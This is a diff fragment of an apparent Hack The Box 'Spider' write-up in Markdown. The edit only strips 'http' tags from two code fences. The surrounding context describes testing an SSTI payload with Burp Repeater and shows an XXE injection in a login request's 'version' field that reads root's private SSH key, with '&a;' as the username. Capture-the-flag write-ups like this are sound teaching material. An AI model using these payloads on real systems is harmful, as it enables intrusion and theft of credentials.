@@ -91,7 +91,7 @@ Also, PHP code doesn't work here, so SSTI is probably gonna be our attack vector
 
 Now that we have our payload, we should use Burp's Repeater function to make our lives easier. To test the payload, we will use a sleep command to replace the `<someCommand>` part of my payload. Our Burp Repeater request looks like this:
 
-```http
+```
 POST /a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal HTTP/1.1
 Host: spider.htb
 Content-Length: 166
@@ -270,7 +270,7 @@ In this template the variable `example` is the return value of a System read of 
 
 To achieve this, we have to remember our 2 `POST` request values, `username`, and `version`. `version` is on the first line and gets closed by a comment by the server. So we have to prematurely close the comment in our `version` input, then insert the call to the SSH key, then reopen a comment for the system to automatically close it. Regarding `username`, all it has to be is a reference to the call to the SSH key, which is assigned to the variable `a`, so `username` would be `&a;`. Load up Burp, access the login page (make sure you logout of the website in case you already logged in before, so the cookies don't get messy), and intercept the login `POST` request. Configure it to look like this:
 
-```http
+```
 username=&a;
 version=1.0.0 --> <!DOCTYPE root [<!ENTITY a SYSTEM 'file:///root/.ssh/id_rsa'>]> <!-- 
 --------------------------------------------------POST REQUEST-----------------------------------------------------
